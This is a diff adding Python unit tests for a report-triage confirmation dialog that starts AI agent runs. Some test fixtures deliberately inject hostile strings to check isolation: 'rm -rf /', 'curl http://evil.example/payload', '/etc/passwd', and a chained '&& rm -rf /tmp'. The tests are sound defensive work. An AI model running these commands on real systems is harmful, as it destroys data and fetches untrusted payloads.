@@ -16,12 +16,14 @@ from __future__ import annotations
 
 import tempfile
 import threading
+import time
 import tkinter as tk
 import unittest
 from pathlib import Path
 from types import SimpleNamespace
 from unittest import mock
 
+from scripts.dev_control_center import reports_create_and_start as cas
 from scripts.dev_control_center import reports_inbox as inbox
 from scripts.dev_control_center import reports_spec_dialog as dialog_mod
 from scripts.dev_control_center import reports_triage as triage
@@ -51,8 +53,9 @@ class _FakeVar:
 
 
 class _FakeTkWidget:
-    def __init__(self, master=None, **_kwargs):
+    def __init__(self, master=None, *, text=None, **_kwargs):
         self.master = master
+        self.text = text
 
     def pack(self, **_kwargs):
         pass
@@ -190,11 +193,13 @@ class ReportSpecDialogCase(unittest.TestCase):
         self.addCleanup(ttk_patch.stop)
 
     def make_dialog(self, report=None, *, on_created=None, target_repo="next-day-setup",
-                     investigate_fn=None):
+                     investigate_fn=None, current_roles=None, create_and_start_fn=None,
+                     resolve_repo_dir_for_confirm=None):
         report = report or make_report()
         return dialog_mod.ReportSpecDialog(
             object(), report, target_repo=target_repo, on_created=on_created,
-            investigate_fn=investigate_fn or _no_result_investigate)
+            investigate_fn=investigate_fn or _no_result_investigate, current_roles=current_roles,
+            create_and_start_fn=create_and_start_fn, resolve_repo_dir_for_confirm=resolve_repo_dir_for_confirm)
 
 
 class TemplateAndSummaryTests(ReportSpecDialogCase):
@@ -494,6 +499,426 @@ class ApplyCriteriaDraftTests(ReportSpecDialogCase):
         original = d.criteria_text.content
         d._apply_criteria_draft()
         self.assertEqual(d.criteria_text.content, original)
+
+
+class CreateAndStartButtonStateTests(ReportSpecDialogCase):
+    """DCC Task 14.5仕様1/C4/C16: 作成して開始 is enabled only once the investigation concluded
+    バグ or 変更要望; a still-running, failed, 質問 or 情報不足 investigation leaves it disabled."""
+
+    def _settle(self, d):
+        d._investigation_thread.join(timeout=5)
+        d._tick()
+
+    def test_disabled_while_investigation_is_still_running(self):
+        block = threading.Event()
+        self.addCleanup(block.set)
+
+        def never_returns(_report, *, stop_event):
+            block.wait(5)
+            return triage.TriageOutcome(None, "", False)
+
+        d = self.make_dialog(investigate_fn=never_returns)
+        self.assertTrue(d.create_and_start_button.instate(["disabled"]))
+
+    def test_disabled_when_the_investigation_failed(self):
+        d = self.make_dialog(investigate_fn=lambda report, *, stop_event:
+                              triage.TriageOutcome(None, "調査できませんでした。", False))
+        self._settle(d)
+        self.assertTrue(d.create_and_start_button.instate(["disabled"]))
+
+    def test_enabled_for_bug(self):
+        result = triage.TriageResult("bug", "high", "E", (), (), "返信")
+        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
+        self._settle(d)
+        self.assertTrue(d.create_and_start_button.instate(["!disabled"]))
+
+    def test_enabled_for_feature_request(self):
+        result = triage.TriageResult("feature_request", "medium", "E", (), (), "返信")
+        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
+        self._settle(d)
+        self.assertTrue(d.create_and_start_button.instate(["!disabled"]))
+
+    def test_disabled_for_spec_misunderstanding(self):
+        result = triage.TriageResult("spec_misunderstanding", "high", "E", (), (), "返信")
+        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
+        self._settle(d)
+        self.assertTrue(d.create_and_start_button.instate(["disabled"]))
+
+    def test_disabled_for_insufficient_info(self):
+        result = triage.TriageResult("insufficient_info", "medium", "E", (), (), "返信")
+        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
+        self._settle(d)
+        self.assertTrue(d.create_and_start_button.instate(["disabled"]))
+
+
+class CreateAndStartConfirmDialogTests(ReportSpecDialogCase):
+    """DCC Task 14.5仕様2/3: the confirmation dialog opened by 作成して開始, and what happens on
+    キャンセル vs 作成して開始. create_and_start_fn is always a fake here -- no real spec file,
+    no real Orchestrator start, no real registry lookup."""
+
+    def _settled_dialog(self, *, criteria_draft=("AIの条件1",), suspected_locations=("foo.py:1",),
+                         classification="bug", create_and_start_fn=None, current_roles=None,
+                         resolve_repo_dir_for_confirm=None, report=None):
+        result = triage.TriageResult(classification, "high", "E", suspected_locations, criteria_draft, "返信")
+        outcome = triage.TriageOutcome(result, "", True)
+        d = self.make_dialog(
+            report=report, investigate_fn=lambda r, *, stop_event: outcome,
+            create_and_start_fn=create_and_start_fn, current_roles=current_roles,
+            resolve_repo_dir_for_confirm=resolve_repo_dir_for_confirm)
+        d._investigation_thread.join(timeout=5)
+        d._tick()
+        return d
+
+    def _settle_start(self, confirm) -> None:
+        """create_and_start_fn now runs on a background thread (review fix, iteration 2) exactly
+        like OrchestratorWindow._confirm_start -- every test that presses 作成して開始 must join
+        that thread and drain the result via one _tick(), the same way _settled_dialog already
+        does for the parent dialog's own background investigation."""
+        confirm._start_thread.join(timeout=5)
+        confirm._tick()
+
+    def test_press_opens_a_confirm_dialog_with_the_expected_display_fields(self):
+        report = make_report(app_display_name="夕食料飲システム", kind="request")
+        d = self._settled_dialog(
+            report=report, current_roles=lambda: ("claude", "codex"),
+            resolve_repo_dir_for_confirm=lambda app_key: Path(r"C:\x\next-day-setup"))
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        info = confirm._confirm_info
+        self.assertEqual(info.app_display_name, "夕食料飲システム")
+        self.assertEqual(info.repo_display_name, "next-day-setup")
+        self.assertEqual(info.roles_text, "Main = Claude / Reviewer = Codex")
+        self.assertEqual(info.task_title, "DCC報告対応（仕様変更の希望）")
+        self.assertTrue(confirm.exists())
+
+    def test_confirm_dialog_shows_the_live_criteria_count(self):
+        """C3: 件数 is shown and stays in sync as either box is edited."""
+        d = self._settled_dialog(
+            criteria_draft=("AIの条件1",), suspected_locations=(),
+            resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        # 3 template lines (base) + 1 AI-suggested line.
+        self.assertEqual(confirm.criteria_count_var.get(), "受入条件: 4件")
+        confirm.ai_text.type("\n追加条件")
+        self.assertEqual(confirm.criteria_count_var.get(), "受入条件: 5件")
+
+    def test_confirm_dialog_prefills_the_base_box_from_the_parent_criteria_and_the_ai_box_is_labeled(self):
+        d = self._settled_dialog(
+            criteria_draft=("AIの条件1", "AIの条件2"), suspected_locations=("foo.py:1",),
+            resolve_repo_dir_for_confirm=lambda app_key: None)
+        d.criteria_text.delete("1.0", "end")
+        d.criteria_text.insert("1.0", "人が編集した条件")
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        self.assertEqual(confirm.base_text.content, "人が編集した条件")
+        self.assertEqual(confirm.ai_text.content, "AIの条件1\nAIの条件2\n修正箇所の候補: foo.py:1")
+        # C7/C1: the "AIの推測（未確認）" heading is actually rendered next to the editable box,
+        # not just present as a module constant.
+        heading_shown = any("AIの推測（未確認）" in (label.text or "") for label in confirm._labels)
+        self.assertTrue(heading_shown)
+
+    def test_button_is_disabled_until_create_and_start_is_pressed_so_nothing_happens_on_open(self):
+        calls = []
+        d = self._settled_dialog(
+            create_and_start_fn=lambda *a, **k: calls.append((a, k)),
+            resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        self.assertEqual(calls, [])
+
+    def test_cancel_creates_nothing_and_starts_nothing(self):
+        calls = []
+
+        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
+            calls.append((report, criteria, main_agent, review_agent))
+            return cas.StartResult(True, spec_path=Path("/should/not/matter"))
+
+        created = []
+        d = self._settled_dialog(
+            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_created = created.append
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm._cancel()
+        self.assertEqual(calls, [])
+        self.assertEqual(created, [])
+        self.assertFalse(confirm.exists())
+        self.assertTrue(d.window.winfo_exists())  # the parent dialog stays open
+
+    def test_create_and_start_writes_once_decides_repo_from_registry_and_closes_both_dialogs(self):
+        calls = []
+
+        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
+            calls.append({"report": report, "criteria": criteria, "main_agent": main_agent,
+                          "review_agent": review_agent})
+            return cas.StartResult(True, spec_path=Path("/fake/spec.json"), run_dir=Path("/fake/run"))
+
+        created = []
+        d = self._settled_dialog(
+            criteria_draft=("AIの条件1",), suspected_locations=(),
+            create_and_start_fn=fake_create_and_start, current_roles=lambda: ("claude", "codex"),
+            resolve_repo_dir_for_confirm=lambda app_key: Path(r"C:\x\next-day-setup"))
+        d._on_created = created.append
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm._on_start()
+        self._settle_start(confirm)
+        self.assertEqual(len(calls), 1)
+        call = calls[0]
+        self.assertEqual(call["main_agent"], "claude")
+        self.assertEqual(call["review_agent"], "codex")
+        self.assertEqual(call["criteria"], list(inbox.SPEC_CRITERIA_TEMPLATE) + ["AIの条件1"])
+        self.assertEqual(created, [Path("/fake/spec.json")])
+        self.assertFalse(confirm.exists())
+        self.assertFalse(d.window.winfo_exists())  # success closes the parent dialog too
+
+    def test_already_running_shows_the_fixed_reason_and_still_hands_off_the_created_spec(self):
+        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
+            return cas.StartResult(False, cas.REASON_ALREADY_RUNNING, spec_path=Path("/fake/spec.json"))
+
+        created = []
+        d = self._settled_dialog(
+            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_created = created.append
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm._on_start()
+        self._settle_start(confirm)
+        self.assertIn(cas.REASON_ALREADY_RUNNING, confirm.notice_var.get())
+        self.assertIn(cas.SPEC_CREATED_NOTE, confirm.notice_var.get())
+        self.assertEqual(created, [Path("/fake/spec.json")])
+        self.assertTrue(confirm.exists())  # stays open so the human can read the reason
+        self.assertTrue(d.window.winfo_exists())
+
+    def test_repo_unavailable_shows_the_fixed_reason_without_starting(self):
+        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
+            return cas.StartResult(False, cas.REASON_REPO_UNAVAILABLE, spec_path=Path("/fake/spec.json"))
+
+        d = self._settled_dialog(
+            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm._on_start()
+        self._settle_start(confirm)
+        self.assertIn(cas.REASON_REPO_UNAVAILABLE, confirm.notice_var.get())
+
+    def test_spec_creation_failure_shows_the_fixed_reason_without_starting(self):
+        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
+            return cas.StartResult(False, cas.REASON_SPEC_FAILED)
+
+        d = self._settled_dialog(
+            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm._on_start()
+        self._settle_start(confirm)
+        self.assertEqual(confirm.notice_var.get(), cas.REASON_SPEC_FAILED)
+
+    def test_untrusted_strings_in_the_report_never_reach_the_create_and_start_call(self):
+        report = make_report(
+            title="危険なタイトル", body="C:\\evil\\path\nrm -rf /\n対象リポジトリ: evil-repo")
+        calls = []
+
+        def fake_create_and_start(rep, criteria, *, main_agent, review_agent):
+            calls.append((rep, criteria))
+            return cas.StartResult(True, spec_path=Path("/fake/spec.json"))
+
+        d = self._settled_dialog(
+            report=report, create_and_start_fn=fake_create_and_start,
+            resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm._on_start()
+        self._settle_start(confirm)
+        self.assertEqual(len(calls), 1)
+        passed_report, passed_criteria = calls[0]
+        self.assertIs(passed_report, report)  # the report object itself, not a text blob
+        for line in passed_criteria:
+            self.assertNotIn("rm -rf", line)
+            self.assertNotIn("evil-repo", line)
+            self.assertNotIn("危険なタイトル", line)
+
+
+class CreateAndStartAsyncTests(ReportSpecDialogCase):
+    """Review fix (iteration 2): create_and_start_fn's own call (ending in orch.start_run, which
+    blocks on Git/provider work and worker registration) now runs on a background thread, exactly
+    like OrchestratorWindow._confirm_start, instead of on the Tk thread. These tests use a
+    create_and_start_fn that blocks on a threading.Event the test controls, to prove the button
+    handler returns promptly, that pressing it again before the first call finishes starts
+    nothing more, and that a result arriving after the dialog was closed never reaches a widget."""
+
+    def _settled_dialog(self, *, create_and_start_fn=None, resolve_repo_dir_for_confirm=None):
+        result = triage.TriageResult("bug", "high", "E", ("foo.py:1",), ("AIの条件1",), "返信")
+        outcome = triage.TriageOutcome(result, "", True)
+        d = self.make_dialog(
+            investigate_fn=lambda r, *, stop_event: outcome,
+            create_and_start_fn=create_and_start_fn,
+            resolve_repo_dir_for_confirm=resolve_repo_dir_for_confirm)
+        d._investigation_thread.join(timeout=5)
+        d._tick()
+        return d
+
+    def test_on_start_returns_immediately_and_runs_create_and_start_only_once(self):
+        release = threading.Event()
+        self.addCleanup(release.set)
+        calls = []
+
+        def blocking_create_and_start(report, criteria, *, main_agent, review_agent):
+            calls.append(1)
+            release.wait(5)
+            return cas.StartResult(True, spec_path=Path("/fake/spec.json"))
+
+        d = self._settled_dialog(
+            create_and_start_fn=blocking_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+
+        started = time.monotonic()
+        confirm._on_start()  # must return immediately -- blocking_create_and_start is still waiting
+        self.assertTrue(confirm.start_button.instate(["disabled"]))
+        confirm._on_start()  # re-entrant presses while the first call is still in flight: no-ops
+        confirm._on_start()
+        self.assertLess(time.monotonic() - started, 2.0)
+
+        release.set()
+        confirm._start_thread.join(timeout=5)
+        confirm._tick()
+        self.assertEqual(len(calls), 1)  # create_and_start_fn itself only ever ran once
+        self.assertFalse(confirm.exists())  # success closes the dialog
+
+    def test_closing_the_dialog_while_starting_drops_a_result_that_arrives_afterwards(self):
+        release = threading.Event()
+        self.addCleanup(release.set)
+
+        def blocking_create_and_start(report, criteria, *, main_agent, review_agent):
+            release.wait(5)
+            return cas.StartResult(True, spec_path=Path("/fake/spec.json"))
+
+        results = []
+        d = self._settled_dialog(
+            create_and_start_fn=blocking_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm._on_result = results.append
+        confirm._on_start()
+        confirm._cancel()  # closes the confirmation dialog while the fake start is still running
+        self.assertTrue(confirm._closed)
+        self.assertFalse(confirm.exists())
+
+        release.set()
+        confirm._start_thread.join(timeout=5)
+        confirm._tick()  # closed guard: must not touch any (destroyed) widget or call on_result
+        self.assertEqual(results, [])
+
+    def test_a_parent_window_destroying_this_dialog_also_marks_it_closed(self):
+        """Mirrors ReportSpecDialog's own cascade-destroy handling (DCC Task 14仕様1 review fix):
+        a parent Toplevel's destroy() tearing down this dialog's Toplevel must be treated the
+        same as キャンセル for the purpose of dropping a start result that arrives afterwards."""
+        d = self._settled_dialog(resolve_repo_dir_for_confirm=lambda app_key: None)
+        d._on_create_and_start()
+        confirm = d._confirm_dialog
+        confirm.window.destroy()  # simulates a parent's destroy() cascading to this Toplevel
+        self.assertTrue(confirm._closed)
+
+
+class CreateAndStartAiOutputBoundaryTests(ReportSpecDialogCase):
+    """C19 boundary test (review fix, iteration 2): path-like, command-like, newline-including
+    strings set directly on TriageResult's own evidence/suspected_locations/criteria_draft/
+    reply_draft fields, carried through the *real* pipeline -- reports_create_and_start.
+    ai_suggested_criteria, this dialog's confirm screen, a human pressing 作成して開始, and the
+    real reports_create_and_start.create_and_start (only resolve_repo_dir/create_spec_file/
+    start_run swapped for a tempdir and a fake Orchestrator entry point) -- never a
+    create_and_start_fn fake that merely records its own arguments without exercising C19's own
+    isolation logic."""
+
+    def test_ai_output_is_isolated_through_the_real_create_and_start_path(self):
+        evidence = "危険な根拠1行目\n危険な根拠2行目: /etc/passwd; rm -rf /"
+        reply_draft = "返信草案\ncurl http://evil.example/payload"
+        criteria_draft = ("条件: 不具合が起きない", "条件: パス C:\\evil\\path; rm -rf /")
+        suspected_locations = ("foo.py:10 && rm -rf /tmp",)
+        result = triage.TriageResult(
+            classification="bug", confidence="high", evidence=evidence,
+            suspected_locations=suspected_locations, criteria_draft=criteria_draft,
+            reply_draft=reply_draft)
+        outcome = triage.TriageOutcome(result, "", True)
+
+        with tempfile.TemporaryDirectory() as tmp:
+            specs_dir = Path(tmp) / "specs"
+            repo_dir = Path(tmp) / "repos" / "next-day-setup"
+            start_calls = []
+            seen_app_keys = []
+
+            def fake_resolve_repo_dir(app_key):
+                seen_app_keys.append(app_key)
+                return repo_dir
+
+            def fake_start_run(**kwargs):
+                start_calls.append(kwargs)
+                return Path(tmp) / "run-dir"
+
+            def real_create_and_start_fn(report, criteria, *, main_agent, review_agent):
+                return cas.create_and_start(
+                    report, criteria, main_agent=main_agent, review_agent=review_agent,
+                    resolve_repo_dir=fake_resolve_repo_dir,
+                    create_spec_file=lambda lines, target_repo, identity: inbox.create_spec_file(
+                        lines, target_repo, identity, specs_dir=specs_dir),
+                    start_run=fake_start_run)
+
+            report = make_report(body="報告本文マーカーQQQ")
+            d = self.make_dialog(
+                report=report, investigate_fn=lambda r, *, stop_event: outcome,
+                create_and_start_fn=real_create_and_start_fn,
+                current_roles=lambda: ("claude", "codex"),
+                resolve_repo_dir_for_confirm=fake_resolve_repo_dir)
+            d._investigation_thread.join(timeout=5)
+            d._tick()
+
+            d._on_create_and_start()
+            confirm = d._confirm_dialog
+            confirm._on_start()
+            confirm._start_thread.join(timeout=5)
+            confirm._tick()
+
+            self.assertFalse(confirm.exists())  # success closes the confirmation dialog
+            self.assertFalse(d.window.winfo_exists())  # and the parent dialog
+
+            # repo is decided only from the registry stub, keyed by app_key alone (C19) -- called
+            # once for the confirmation dialog's own display and once inside create_and_start.
+            self.assertEqual(seen_app_keys, ["next-day-setup"] * len(seen_app_keys))
+            self.assertTrue(seen_app_keys)
+            self.assertEqual(len(start_calls), 1)
+            call = start_calls[0]
+            self.assertEqual(call["repo"], str(repo_dir))
+            self.assertEqual(call["main_agent"], "claude")
+            self.assertEqual(call["review_agent"], "codex")
+
+            # the task text is the fixed template + kind label only -- never the AI output or the
+            # report body, even though evidence/reply_draft/suspected_locations are path-like,
+            # command-like and contain embedded newlines.
+            task_text = call["task"]
+            self.assertNotIn("rm -rf", task_text)
+            self.assertNotIn("curl", task_text)
+            self.assertNotIn("/etc/passwd", task_text)
+            self.assertNotIn(evidence, task_text)
+            self.assertNotIn(reply_draft, task_text)
+            self.assertNotIn("報告本文マーカーQQQ", task_text)
+            self.assertIn("DCC報告対応", task_text)
+
+            spec_files = list(specs_dir.glob("*.json"))
+            self.assertEqual(len(spec_files), 1)
+            spec_text = spec_files[0].read_text(encoding="utf-8")
+            loaded_criteria = [c["text"] for c in inbox.taskspec.load_spec_file(spec_files[0]).criteria]
+            # the AI-suggested criteria the human left in place are the *only* place this
+            # candidate text may land, and only as acceptance-criteria lines (never executed,
+            # never a path/command the spec-loader itself interprets).
+            self.assertIn("条件: パス C:\\evil\\path; rm -rf /", loaded_criteria)
+            self.assertIn("修正箇所の候補: foo.py:10 && rm -rf /tmp", loaded_criteria)
+            # evidence and reply_draft must never reach the spec file at all (C2/C19).
+            self.assertNotIn(evidence, spec_text)
+            self.assertNotIn("危険な根拠", spec_text)
+            self.assertNotIn(reply_draft, spec_text)
+            self.assertNotIn("curl", spec_text)
+            self.assertNotIn("報告本文マーカーQQQ", spec_text)
 
 
 if __name__ == "__main__":
